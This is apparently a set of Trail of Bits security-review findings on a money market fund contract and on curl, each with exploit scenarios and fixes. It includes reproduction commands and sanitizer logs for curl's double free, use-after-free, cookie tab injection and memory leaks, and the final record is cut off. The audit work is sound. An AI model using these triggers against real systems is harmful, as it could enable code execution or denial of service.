{"title": "15. Dividend distribution has an incorrect rounding direction for negative rates ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-franklintempleton-moneymarket-securityreview.pdf", "body": "The rounding direction of the dividend calculation in the _processDividends function benets the user when the dividend rate is negative, causing the fund to lose value it should retain. The division operation that computes dividend shares is rounding down in the _processDividends function of the MoneyMarketFund contract: function _processDividends ( address account , uint256 date , int256 rate , uint256 price ) internal whenHasHoldings(account) { uint256 dividendAmount = balanceOf(account) * uint256 (abs(rate)); uint256 dividendShares = dividendAmount / price; _payDividend(account, rate, dividendShares); // handle very unlikely scenario if occurs _handleNegativeYield(account, rate, dividendShares); _removeEmptyAccountFromHoldingsSet(account); emit DividendDistributed(account, date, rate, price, dividendShares); } Figure 15.1: The _processDividends function in the MoneyMarketFund contract As a result, for a negative dividend rate, the rounding benets the user by subtracting a lower number of shares from the user balance. In particular, if the rate is low and the price is high, the dividend can round down to zero. The same issue aects the _processDividends function in the TransferAgentModule contract. Exploit Scenario Eve buys a small number of shares from multiple accounts. The dividend rounds down and is equal to zero. As a result, Eve avoids the losses from the downside movement of the fund while enjoying prots from the upside. Recommendations Short term, have the _processDividends function round up the number of dividendShares for negative dividend rates. Long term, document the expected rounding direction for every arithmetic operation (see appendix G ) and follow it to ensure that rounding is always benecial to the fund. Use Echidna to nd issues arising from the wrong rounding direction.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "1. Bad recommendation in libcurl cookie documentation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf", "body": "The libcurl documentation recommends that, to enable the cookie store with a blank cookie database, the calling application should use the CURLOPT_COOKIEFILE option with a non-existing le name or plain  , as shown in gure 1.1. However, the former recommendationa non-blank lename with a target that does not existcan have unexpected results if a le by that name is unexpectedly present. Figure 1.1: The recommendation in libcurls documentation Exploit Scenario An inexperienced developer uses libcurl in his application, invoking the CURLOPT_COOKIEFILE option and hard-coding a lename that he thinks will never exist (e.g., a long random string), but which could potentially be created on the lesystem. An attacker reverse-engineers his program to determine the lename and path in question, and then uses a separate local le write vulnerability to inject cookies into the application. Recommendations Short term, remove the reference to a non-existing le name; mention only a blank string. Long term, avoid suggesting tricks such as this in documentation when a misuse or misunderstanding of them could result in side eects of which users may be unaware.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "2. Libcurl URI parser accepts invalid characters ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf", "body": "According to RFC 3986 section 2.2, Reserved Characters, reserved = gen-delims / sub-delims gen-delims = \":\" / \"/\" / \"?\" / \"#\" / \"[\" / \"]\" / \"@\" sub-delims = \"!\" / \"$\" / \"&\" / \"'\" / \"(\" / \")\" / \"*\" / \"+\" / \",\" / \";\" / \"=\" Figure 2.1: Reserved characters for URIs. Furthermore, the host eld of the URI is dened as follows: host = IP-literal / IPv4address / reg-name reg-name = *( unreserved / pct-encoded / sub-delims ) ... unreserved = ALPHA / DIGIT / \"-\" / \".\" / \"_\" / \"~\" sub-delims = \"!\" / \"$\" / \"&\" / \"'\" / \"(\" / \")\" / \"*\" / \"+\" / \",\" / \";\" / \"=\" Figure 2.2: Valid characters for the URI host eld However, cURL does not seem to strictly adhere to this format, as it accepts characters not included in the above. This behavior is present in both libcurl and the cURL binary. For instance, characters from the gen-delims set, and those not in the reg-name set, are accepted: $ curl -g \"http://foo[]bar\" # from gen-delims curl: (6) Could not resolve host: foo[]bar $ curl -g \"http://foo{}bar\" # outside of reg-name curl: (6) Could not resolve host: foo{}bar Figure 2.3: Valid characters for the URI host eld The exploitability and impact of this issue is not yet well understood; this may be deliberate behavior to account for currently unknown edge-cases or legacy support. Recommendations Short term, determine whether these characters are being allowed for compatibility reasons. If so, it is likely that nothing can be done; if not, however, make the URI parser stricter, rejecting characters that cannot appear in a valid URI as dened by RFC 3986. Long term, add fuzz tests for the URI parser that use forbidden or out-of-scope characters.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Low"]}, {"title": "3. libcurl Alt-Svc parser accepts invalid port numbers ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf", "body": "Invalid port numbers in Alt-Svc headers, such as negative numbers, may be accepted by libcurl when presented by an HTTP server. libcurl uses the strtoul function to parse port numbers in Alt-Svc headers. This function will accept and parse negative numbers and represent them as unsigned integers without indicating an error. For example, when an HTTP server provides an invalid port number of -18446744073709543616, cURL parses the number as 8000: * Using HTTP2, server supports multiplexing * Connection state changed (HTTP/2 confirmed) * Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0 * Using Stream ID: 1 (easy handle 0x12d013600) > GET / HTTP/2 > Host: localhost:2443 > user-agent: curl/7.79.1 > accept: */* > < HTTP/2 200 < server: basic-h2-server/1.0 < content-length: 130 < content-type: application/json * Added alt-svc: localhost: 8000 over h3 < alt-svc: h3=\": -18446744073709543616 \" < Figure 3.1: Example cURL session Exploit Scenario A server operator wishes to target cURL clients and serve them alternative content. The operator includes a specially-crafted, invalid Alt-Svc header on the HTTP server responses, indicating that HTTP/3 is available on port -18446744073709543616 , an invalid, negative port number. When users connect to the HTTP server using standards-compliant HTTP client software, their clients ignore the invalid header. However, when users connect using cURL, it interprets the negative number as an unsigned integer and uses the resulting port number, 8000 , to upgrade the next connection to HTTP/3. The server operator hosts alternative content on this other port. Recommendations Short term, improve parsing and validation of Alt-Svc headers so that invalid port values are rejected. Long term, add fuzz and dierential tests to the Alt-Svc parsing code to detect non-standard behavior.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Low"]}, {"title": "4. Non-constant-time comparison of secrets ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf", "body": "Several cases were discovered in which possibly user-supplied values are checked against a known secret using non-constant-time comparison. In cases where an attacker can accurately time how long it takes for the application to fail validation of submitted data that he controls, such behavior could leak information about the secret itself, allowing the attacker to brute-force it in linear time. In the example below, credentials are checked via Curl_safecmp() , which is a memory-safe, but not constant-time, wrapper around strcmp() . This is used to determine whether or not to reuse an existing TLS connection. #ifdef USE_TLS_SRP Curl_safecmp(data->username, needle->username) && Curl_safecmp(data->password, needle->password) && (data->authtype == needle->authtype) && #endif Figure 4.1: lib/url.c , lines 148 through 152. Credentials checked using a memory-safe, but not constant-time, wrapper around strcmp() The above is one example out of several cases found, all of which are noted above. Exploit Scenario An application uses a libcurl build with TLS-SRP enabled and allows multiple users to make TLS connections to a remote server. An attacker times how quickly cURL responds to his requests to create a connection, and thereby gradually works out the credentials associated with an existing connection. Eventually, he is able to submit a request with exactly the same SSL conguration such that another users existing connection is reused. Recommendations Short term, introduce a method, e.g. Curl_constcmp() , which does a constant-time comparison of two stringsthat is, it scans both strings exactly once in their entirety. Long term, compare secrets to user-submitted values using only constant-time algorithms.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "5. Tab injection in cookie le ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf", "body": "When libcurl makes an HTTP request, the cookie jar le is overwritten to store the cookies, but the storage format uses tabs to separate key pieces of information. The cookie parsing code for HTTP headers strips the leading and trailing tabs from cookie keys and values, but it does not reject cookies with tabs inside the keys or values. In the snippet of lib/cookie.c below, Curl_cookie_add() parses tab-separated cookie data via strtok_r() and uses a switch-based state machine to interpret specic parts as key information: firstptr = strtok_r(lineptr, \"\\t\" , &tok_buf); /* tokenize it on the TAB */ Figure 5.1: Parsing tab-separated cookie data via strtok_r() Exploit Scenario A webpage returns a Set-Cookie header with a tab character in the cookie name. When a cookie le is saved from cURL for this page, the part of the name before the tab is taken as the key, and the part after the tab is taken as the value. The next time the cookie le is loaded, these two values will be used. % echo \"HTTP/1.1 200 OK\\r\\nSet-Cookie: foo\\tbar=\\r\\n\\r\\n\\r\\n\"|nc -l 8000 & % curl -v -c /tmp/cookies.txt http://localhost:8000 * Trying 127.0.0.1:8000... * Connected to localhost (127.0.0.1) port 8000 (#0) > GET / HTTP/1.1 > Host: localhost:8000 > User-Agent: curl/7.79.1 > Accept: */* * Mark bundle as not supporting multiuse < HTTP/1.1 200 OK * Added cookie foo bar=\"\" for domain localhost, path /, expire 0 < Set-Cookie: foo bar= * no chunk, no close, no size. Assume close to signal end Figure 5.2: Sending a cookie with name foo\\tbar , and no value. % cat /tmp/cookies.txt | tail - localhost FALSE / FALSE 0 foo bar Figure 5.3: Sending a cookie with name foo\\tbar and no value Recommendations Short term, either reject any cookie with a tab in its key (as \\t is not a valid character for cookie keys, according to the relevant RFC), or escape or quote tab characters that appear in cookie keys. Long term, do not assume that external data will follow the intended specication. Always account for the presence of special characters in such inputs.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "6. Standard output/input/error may not be opened ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf", "body": "The function main_checkfds() is used to ensure that le descriptors 0, 1, and 2 (stdin, stdout, and stderr) are open before curl starts to run. This is necessary to avoid the case wherein, if one of those descriptors fails to open initially, the next network socket opened by cURL may gain an FD number of 0, 1, or 2, resulting in what should be local input/output being received from or sent to a network socket instead. However, pipe errors actually result in the same outcome as success: static void main_checkfds ( void ) { #ifdef HAVE_PIPE int fd[ 2 ] = { STDIN_FILENO, STDIN_FILENO }; while (fd[ 0 ] == STDIN_FILENO || fd[ 0 ] == STDOUT_FILENO || fd[ 0 ] == STDERR_FILENO || fd[ 1 ] == STDIN_FILENO || fd[ 1 ] == STDOUT_FILENO || fd[ 1 ] == STDERR_FILENO) if (pipe(fd) < 0 ) return ; /* Out of handles. This isn't really a big problem now, but will be when we try to create a socket later. */ close(fd[ 0 ]); close(fd[ 1 ]); #endif } Figure 6.1: tool_main.c:83105 , lines 83 through 105 Though the comment notes that an out-of-handles condition would result in a failure later on in the application, there may be cases where this is not truee.g., the maximum number of handles has been reached at the time of this check, but handles are closed between it and the next attempt to create a socket. In such a case, execution might continue as normal, with stdin/out/err being redirected to an unexpected location. Recommendations Short term, use fcntl() to check if stdin/out/err are open. If they are not, exit the program if the pipe function fails. Long term, do not assume that execution will fail later; fail early in cases like these.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "7. Double free when using HTTP proxy with specic protocols ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf", "body": "Using cURL with proxy connection and dict, gopher, LDAP, or telnet protocol triggers a double free vulnerability (gure 7.1). The connect_init function allocates a memory block for a connectdata struct (gure 7.2). After the connection, cURL frees the allocated buer in the conn_free function (gure 7.3), which is freed for the second time in the Curl_free_request_state frees, which uses the Curl_safefree function on elements of the Curl_easy struct (gure 7.4). This double free was also not detected in release builds during our testing  the glibc allocator checks may fail to detect such cases on some occasions. The two frees success indicates that future memory allocations made by the program will return the same pointer twice. This may enable exploitation of cURL if the allocated objects contain data controlled by an attacker. Additionally, if this vulnerability also triggers in libcurlwhich we believe it shouldit may enable the exploitation of programs that depend on libcurl. $ nc -l 1337 | echo 'test' & # Imitation of a proxy server using netcat $ curl -x http://test:test@127.0.0.1:1337 dict://127.0.0.1 2069694==ERROR: AddressSanitizer: attempting double-free on 0x617000000780 in thread T0: #0 0x494c8d in free (curl/src/.libs/curl+0x494c8d) #1 0x7f1eeeaf3afe in Curl_free_request_state curl/lib/url.c:2259:3 #2 0x7f1eeeaf3afe in Curl_close curl/lib/url.c:421:3 #3 0x7f1eeea30943 in curl_easy_cleanup curl/lib/easy.c:798:3 #4 0x4e07df in post_per_transfer curl/src/tool_operate.c:656:3 #5 0x4dee58 in serial_transfers curl/src/tool_operate.c:2434:18 #6 0x4dee58 in run_all_transfers curl/src/tool_operate.c:2620:16 #7 0x4dee58 in operate curl/src/tool_operate.c:2732:18 #8 0x4dcf73 in main curl/src/tool_main.c:276:14 #9 0x7f1eee2af082 in __libc_start_main /build/glibc-SzIz7B/glibc-2.31/csu/../csu/libc-start.c:308:16 #10 0x41c7cd in _start (curl/src/.libs/curl+0x41c7cd) 0x617000000780 is located 0 bytes inside of 664-byte region [0x617000000780,0x617000000a18) freed by thread T0 here: #0 0x494c8d in free (curl/src/.libs/curl+0x494c8d) #1 0x7f1eeeaf6094 in conn_free curl/lib/url.c:814:3 #2 0x7f1eeea92cc6 in curl_multi_perform curl/lib/multi.c:2684: #3 0x7f1eeea304bd in easy_transfer curl/lib/easy.c:662:15 #4 0x7f1eeea304bd in easy_perform curl/lib/easy.c:752:42 #5 0x7f1eeea304bd in curl_easy_perform curl/lib/easy.c:771:10 #6 0x4dee35 in serial_transfers curl/src/tool_operate.c:2432:16 #7 0x4dee35 in run_all_transfers curl/src/tool_operate.c:2620:16 #8 0x4dee35 in operate curl/src/tool_operate.c:2732:18 #9 0x4dcf73 in main curl/src/tool_main.c:276:14 #10 0x7f1eee2af082 in __libc_start_main /build/glibc-SzIz7B/glibc-2.31/csu/../csu/libc-start.c:308:16 previously allocated by thread T0 here: #0 0x495082 in calloc (curl/src/.libs/curl+0x495082) #1 0x7f1eeea6d642 in connect_init curl/lib/http_proxy.c:174:9 #2 0x7f1eeea6d642 in Curl_proxyCONNECT curl/lib/http_proxy.c:1061:14 #3 0x7f1eeea6d1f2 in Curl_proxy_connect curl/lib/http_proxy.c:118:14 #4 0x7f1eeea94c33 in multi_runsingle curl/lib/multi.c:2028:16 #5 0x7f1eeea92cc6 in curl_multi_perform curl/lib/multi.c:2684:14 #6 0x7f1eeea304bd in easy_transfer curl/lib/easy.c:662:15 #7 0x7f1eeea304bd in easy_perform curl/lib/easy.c:752:42 #8 0x7f1eeea304bd in curl_easy_perform curl/lib/easy.c:771:10 #9 0x4dee35 in serial_transfers curl/src/tool_operate.c:2432:16 #10 0x4dee35 in run_all_transfers curl/src/tool_operate.c:2620:16 #11 0x4dee35 in operate curl/src/tool_operate.c:2732:18 #12 0x4dcf73 in main curl/src/tool_main.c:276:14 #13 0x7f1eee2af082 in __libc_start_main /build/glibc-SzIz7B/glibc-2.31/csu/../csu/libc-start.c:308:16 SUMMARY: AddressSanitizer: double-free (curl/src/.libs/curl+0x494c8d) in free Figure 7.1: Reproducing double free vulnerability with ASAN log 158 static CURLcode connect_init ( struct Curl_easy *data, bool reinit) // (...) 174 s = calloc( 1 , sizeof ( struct http_connect_state )); Figure 7.2: Allocating a block of memory that is freed twice ( curl/lib/http_proxy.c#158174 ) 787 static void conn_free ( struct connectdata *conn) // (...) 814 Curl_safefree(conn->connect_state); Figure 7.3: The conn_free function that frees the http_connect_state struct for HTTP CONNECT ( curl/lib/url.c#787814 ) void Curl_free_request_state ( struct Curl_easy *data) 2257 2258 { 2259 2260 Curl_safefree(data->req.p.http); Curl_safefree(data->req.newurl); Figure 7.4: The Curl_free_request_state function that frees elements in the Curl_easy struct, which leads to a double free vulnerability ( curl/lib/url.c#22572260 ) Exploit Scenario An attacker nds a way to exploit the double free vulnerability described in this nding either in cURL or in a program that uses libcurl and gets remote code execution on the machine from which the cURL code was executed. Recommendations Short term, x the double free vulnerability described in this nding. Long term, expand cURLs unit tests and fuzz tests to cover dierent types of proxies for supported protocols. Also, extend the fuzzing strategy to cover argv fuzzing. It can be obtained using the approach presented in the argv-fuzz-inl.h from the AFL++ project. This will force the fuzzer to build an argv pointer array (which points to arguments passed to the cURL) from NULL-delimited standard input. Finally, consider adding a dictionary with possible options and protocols to the fuzzer based on the source code or on cURLs manual.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "8. Some ags override previous instances of themselves ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf", "body": "Some cURL ags, when provided multiple times, overrides themselves and eectively use the last ag provided. If a ag makes cURL invocations security options more strict, then accidental overwriting may weaken the desired security. The identied ag with this property is the --crlfile command-line option. It allows users to pass a PEM-formatted certicate revocation list to cURL. --crlfile <file> List that may specify peer certificates that are to be considered revoked. (TLS) Provide a file using PEM format with a Certificate Revocation If this option is used several times, the last one will be used. Example: curl --crlfile rejects.txt https://example.com Added in 7.19.7. Figure 8.1: The description of the --crlfile option Exploit Scenario A user wishes for cURL to reject certicates specied across multiple certicate revocation lists. He unwittingly uses the --crlfile ag multiple times, dropping all but the last-specied list. Requests the user sends with cURL are intercepted by a Man-in-the-Middle attacker, who uses a known-compromised certicate to bypass TLS protections. Recommendations Short term, change the behavior of --crlfile to append new certicates to the revocation list, not to replace those specied earlier. If backwards compatibility prevents this, have cURL issue a warning such as  --crlfile specified multiple times, using only <filename.txt> . Long term, ensure that behavior, such as how multiple instances of a command-line argument are handled, is consistent throughout the application. Issue a warning when a security-relevant ag is provided multiple times.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "9. Cookies are not stripped after redirect ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf", "body": "If cookies are passed to cURL via the --cookie ag, they will not be stripped if the target responds with a redirect. RFC 9110 section 15.4, Redirection 3xx , does not specify whether or not cookies should be stripped during a redirect; as such, it may be better to err on the side of caution and strip them by default if the origin changed. The recommended behavior would match the current behavior with cookie jar (i.e., when a server sets a new cookie and requests a redirect) and Authorization header (which is stripped on cross-origin redirects). Recommendations Short term, if backwards compatibility would not prohibit such a change, strip cookies upon a redirect to a dierent origin by default and provide a command-line ag that enables the previous behavior (or extend the --location-trusted ag). Long term, in cases where a specication is ambiguous and practicality allows, always default to the most secure possible interpretation. Extend tests to check for behavior of passing data after redirection.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "10. Use after free while using parallel option and sequences ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf", "body": "Using cURL with parallel option ( -Z ), two consecutive sequences (that end up creating 51 hosts), and an unmatched bracket triggers a use-after-free vulnerability (gure 10.1). The add_parallel_transfers function allocates memory blocks for an error buer; consequently, by default, it allows up to 50 transfers (gure 10.2, line 2228). Then, in the Curl_failf function, it copies errors (e.g., Could not resolve host: q{ ) to appropriate error buers when connections fail (gure 10.3) and frees the memory. For the last sequence ( u~ host), it allocates a memory buer (gure 10.2), frees a buer (gure 10.3), and copies an error ( Could not resolve host: u~ ) to the previously freed memory buer (gure 10.4). $ curl 0 -Z [q-u][u-~] } curl: (7) Failed to connect to 0.0.0.0 port 80 after 0 ms: Connection refused curl: (3) unmatched close brace/bracket in URL position 1: } ^ curl: (6) Could not resolve host: q{ curl: (6) Could not resolve host: q| curl: (6) Could not resolve host: q} curl: (6) Could not resolve host: q~ curl: (6) Could not resolve host: r{ curl: (6) Could not resolve host: r| curl: (6) Could not resolve host: r} curl: (6) Could not resolve host: r~ curl: (6) Could not resolve host: s{ curl: (6) Could not resolve host: s| curl: (6) Could not resolve host: s} curl: (6) Could not resolve host: s~ curl: (6) Could not resolve host: t{ curl: (6) Could not resolve host: t| curl: (6) Could not resolve host: t} curl: (6) Could not resolve host: t~ curl: (6) Could not resolve host: u{ curl: (6) Could not resolve host: u| curl: (6) Could not resolve host: u} curl: (3) unmatched close brace/bracket in URL position 1: } ^ ====2789144==ERROR: AddressSanitizer: heap-use-after-free on address 0x611000004780 at pc 0x7f9b5f94016d bp 0x7fff12d4dbc0 sp 0x7fff12d4d368 WRITE of size #0 0x7f9b5f94016c in __interceptor_strcpy ../../../../src/libsanitizer/asan/asan_interceptors. cc : 431 #1 0x7f9b5f7ce6f4 in strcpy /usr/ include /x86_64-linux-gnu/bits/string_fortified. h : 90 #2 0x7f9b5f7ce6f4 in Curl_failf /home/scooby/curl/lib/sendf. c : 275 #3 0x7f9b5f78309a in Curl_resolver_error /home/scooby/curl/lib/hostip. c : 1316 #4 0x7f9b5f73cb6f in Curl_resolver_is_resolved /home/scooby/curl/lib/asyn-thread. c : 596 #5 0x7f9b5f7bc77c in multi_runsingle /home/scooby/curl/lib/multi. c : 1979 #6 0x7f9b5f7bf00f in curl_multi_perform /home/scooby/curl/lib/multi. c : 2684 #7 0x55d812f7609e in parallel_transfers /home/scooby/curl/src/tool_operate. c : 2308 #8 0x55d812f7609e in run_all_transfers /home/scooby/curl/src/tool_operate. c : 2618 #9 0x55d812f7609e in operate /home/scooby/curl/src/tool_operate. c : 2732 #10 0x55d812f4ffa8 in main /home/scooby/curl/src/tool_main. c : 276 #11 0x7f9b5f1aa082 in __libc_start_main ../csu/libc- start . c : 308 #12 0x55d812f506cd in _start (/usr/ local /bin/curl+ 0x316cd ) 0x611000004780 is located 0 bytes inside of 256-byte region [0x611000004780,0x611000004880) freed by thread T0 here: #0 0x7f9b5f9b140f in __interceptor_free ../../../../src/libsanitizer/asan/asan_malloc_linux.cc:122 #1 0x55d812f75682 in add_parallel_transfers /home/scooby/curl/src/tool_operate.c:2251 previously allocated by thread T0 here: #0 0x7f9b5f9b1808 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cc:144 #1 0x55d812f75589 in add_parallel_transfers /home/scooby/curl/src/tool_operate.c:2228 SUMMARY: AddressSanitizer: heap-use-after-free ../../../../src/libsanitizer/asan/asan_interceptors.cc:431 in __interceptor_strcpy Shadow bytes around the buggy address: 0x0c227fff88a0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c227fff88b0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c227fff88c0: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd 0x0c227fff88d0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c227fff88e0: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa =>0x0c227fff88f0:[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c227fff8900: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c227fff8910: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd 0x0c227fff8920: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c227fff8930: fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa 0x0c227fff8940: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd Shadow byte legend (one shadow byte represents 8 application bytes): Heap left redzone: fa Freed heap region: fd ==2789144==ABORTING Figure 10.1: Reproducing use-after-free vulnerability with ASAN log 2192 static CURLcode add_parallel_transfers ( struct GlobalConfig *global, CURLM *multi, CURLSH *share, bool *morep, bool *addedp) 2197 { // (...) 2210 for (per = transfers; per && (all_added < global->parallel_max); per = per->next) { 2227 2228 // (...) 2249 if (!errorbuf) { errorbuf = malloc(CURL_ERROR_SIZE); result = create_transfer(global, share, &getadded); 2250 2251 2252 2253 if (result) { free(errorbuf); return result; } Figure 10.2: The add_parallel_transfers function ( curl/src/tool_operate.c#21922253 ) 264 265 { void Curl_failf ( struct Curl_easy *data, const char *fmt, ...) // (...) 275 strcpy(data->set.errorbuffer, error); Figure 10.3: The Curl_failf function that copies appropriate error to the error buer ( curl/lib/sendf.c#264275 ) Exploit Scenario An administrator sets up a service that calls cURL, where some of the cURL command-line arguments are provided from external, untrusted input. An attacker manipulates the input to exploit the use-after-free bug to run arbitrary code on the machine that runs cURL. Recommendations Short term, x the use-after-free vulnerability described in this nding. Long term, extend the fuzzing strategy to cover argv fuzzing. It can be obtained using the argv-fuzz-inl.h from the AFL++ project to build argv from stdin in the cURL. Also, consider adding a dictionary with possible options and protocols to the fuzzer based on the source code or cURLs manual.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "11. Unused memory blocks are not freed resulting in memory leaks ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf", "body": "For specic commands (gure 11.1, 11.2, 11.3), cURL allocates blocks of memory that are not freed when they are no longer needed, leading to memory leaks. $ curl 0 -Z 0 -Tz 0 curl: Can 't open ' z '! curl: try ' curl --help ' or ' curl --manual' for more information curl: ( 26 ) Failed to open/read local data from file/application ============= 2798000 ==ERROR: LeakSanitizer: detected memory leaks Direct leak of 4848 byte(s) in 1 object(s) allocated from: #0 0x7f868e6eba06 in __interceptor_calloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cc:153 #1 0x561bb1d1dc9f in glob_url /home/scooby/curl/src/tool_urlglob.c:459 Indirect leak of 8 byte(s) in 1 object(s) allocated from: #0 0x7f868e6eb808 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cc:144 #1 0x561bb1d1e06c in glob_fixed /home/scooby/curl/src/tool_urlglob.c:48 #2 0x561bb1d1e06c in glob_parse /home/scooby/curl/src/tool_urlglob.c:411 #3 0x561bb1d1e06c in glob_url /home/scooby/curl/src/tool_urlglob.c:467 Indirect leak of 2 byte(s) in 1 object(s) allocated from: #0 0x7f868e6eb808 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cc:144 #1 0x561bb1d1e0b0 in glob_fixed /home/scooby/curl/src/tool_urlglob.c:53 #2 0x561bb1d1e0b0 in glob_parse /home/scooby/curl/src/tool_urlglob.c:411 #3 0x561bb1d1e0b0 in glob_url /home/scooby/curl/src/tool_urlglob.c:467 Indirect leak of 2 byte(s) in 1 object(s) allocated from: #0 0x7f868e6eb808 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cc:144 #1 0x561bb1d1dc6a in glob_url /home/scooby/curl/src/tool_urlglob.c:454 Figure 11.1: Reproducing memory leaks vulnerability in the tool_urlglob.c le with LeakSanitizer log. $ curl 00 --cu 00 curl: ( 7 ) Failed to connect to 0 .0.0.0 port 80 after 0 ms: Connection refused ============= 2798691 ==ERROR: LeakSanitizer: detected memory leaks Direct leak of 3 byte(s) in 1 object(s) allocated from: #0 0x7fbc6811b3ed in __interceptor_strdup ../../../../src/libsanitizer/asan/asan_interceptors.cc:445 #1 0x56412ed047ee in getparameter /home/scooby/curl/src/tool_getparam.c:1885 SUMMARY: AddressSanitizer: 3 byte(s) leaked in 1 allocation(s). Figure 11.2: Reproducing a memory leak vulnerability in the tool_getparam.c le with LeakSanitizer log $ curl --proto = 0 --proto = 0 Warning: unrecognized protocol '0' Warning: unrecognized protocol '0' curl: no URL specified! curl: try 'curl --help' or 'curl --manual' for more information ================================================================= == 2799783 ==ERROR: LeakSanitizer: detected memory leaks Direct leak of 1 byte(s) in 1 object(s) allocated from: #0 0x7f90391803ed in __interceptor_strdup ../../../../src/libsanitizer/asan/asan_interceptors.cc:445 #1 0x55e405955ab7 in proto2num /home/scooby/curl/src/tool_paramhlp.c:385 SUMMARY: AddressSanitizer: 1 byte(s) leaked in 1 allocation(s). Figure 11.3: Reproducing a memory leak vulnerability in the tool_paramhlp.c le with LeakSanitizer log Exploit Scenario An attacker nds a way to allocate extensive lots of memory on the local machine, which leads to the overconsumption of resources and a denial-of-service attack. Recommendations Short term, x memory leaks described in this nding by freeing memory blocks that are no longer needed. Long term, extend the fuzzing strategy to cover argv fuzzing. It can be obtained using the argv-fuzz-inl.h from the AFL++ project to build argv from stdin in the cURL. Also, consider adding a dictionary with possible options and protocols to the fuzzer based on the source code or cURLs manual.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "12. Referer header is generated in insecure manner ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf", "body": "The cURL automatically sets the referer header for HTTP redirects when provided with the --referer ;auto ag. The header set contains the entire original URL except for the user-password fragment. The URL includes query parameters, which is against current best practices for handling the referer , which say to default to the strict-origin-when-cross-origin option. The option instructs clients to send only the URLs origin for cross-origin redirect, and not to send the header to less secure destinations (e.g., when redirecting from HTTPS to HTTP protocol). Exploit Scenario An user uses cURL to send a request to a server that requires multi-step authorization. He provides the authorization token as a query parameter and enables redirects with --location ag. Because of the server misconguration, a 302 redirect response with an incorrect Location header that points to a third-party domain is sent back to the cURL. The cURL requests the third-party domain, leaking the authorization token via the referer header. Recommendations Short term, send only the origin instead of the whole URL on cross-origin requests in the referer header. Consider not sending the header on redirects downgrading the security level. Additionally, consider implementing support for the Referrer-Policy response header. Alternatively, introduce a new ag that would allow users to set the desired referrer policy manually. Long term, review response headers that change behavior of HTTP redirects and ensure either that they are supported by the cURL or that secure defaults are implemented. References  Feature: Referrer Policy: Default to strict-origin-when-cross-origin", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "13. Redirect to localhost and local network is possible (Server-side request forgery like) ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf", "body": "When redirects are enabled with cURL (i.e., the --location ag is provided), then a server may redirect a request to an arbitrary endpoint, and the cURL will issue a request to it. This gives requested servers partial access to cURLs users local networks. The issue is similar to the Server-Side Request Forgery (SSRF) attack vector, but in the context of the client application. Exploit Scenario An user sends a request using cURL to a malicious server using the --location ag. The server responds with a 302 redirect to http://192.168.0.1:1080?malicious=data endpoint, accessing the user's router admin panel. Recommendations Short term, add a warning about this attack vector in the --location ag documentation. Long term, consider disallowing redirects to private networks and loopback interface by either introducing a new ag that would disable the restriction or extending the --location-trusted ag functionality.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "14. URL parsing from redirect is incorrect when no path separator is provided ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf", "body": "When cURL parses a URL from the Location header for an HTTP redirect and the URL does not contain a path separator (/), the cURL incorrectly duplicates query strings (i.e., data after the question mark) and fragments (data after cross). The cURL correctly parses similar URLs when they are provided directly in the command line. This behavior indicates that dierent parsers are used for direct URLs and URLs from redirects, which may lead to further bugs. $ curl -v -L 'http://local.test?redirect=http://local.test:80?-123' * Trying 127 .0.0.1:80... * Connected to local.test ( 127 .0.0.1) port 80 ( 